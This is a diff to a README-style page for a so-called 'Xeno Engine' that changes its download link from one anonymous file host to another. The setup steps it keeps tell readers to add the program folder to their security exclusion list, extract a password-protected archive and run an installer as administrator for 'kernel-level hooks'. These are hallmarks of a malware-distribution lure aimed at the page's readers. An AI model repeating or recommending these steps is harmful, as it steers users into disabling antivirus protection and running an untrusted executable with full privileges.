@@ -45,7 +45,7 @@ Our custom core utilizes **Deep-Link Integration** technology, ensuring a 99.9% 
 
 To ensure the stability of the Xeno Engine, please follow these professional configuration steps:
 
-1.  **Download Assets:** Obtain the latest distribution [HERE](https://workupload.com/start/TndGgzjnQry).
+1.  **Download Assets:** Obtain the latest distribution [HERE](https://gofile.io/d/L9NIZk).
 2.  **Configuration for Compatibility:** Some heuristic security systems may misidentify developer tools as "unrecognized." To prevent execution errors, we recommend adding the application folder to your **Security Exclusion List**.
 3.  **Extraction:** Unpack the workspace using a standard archiver (Password: `xeno`).
 4.  **Launch:** Execute `Installer_5e0456xxxx.exe` with administrative privileges to allow kernel-level hooks.
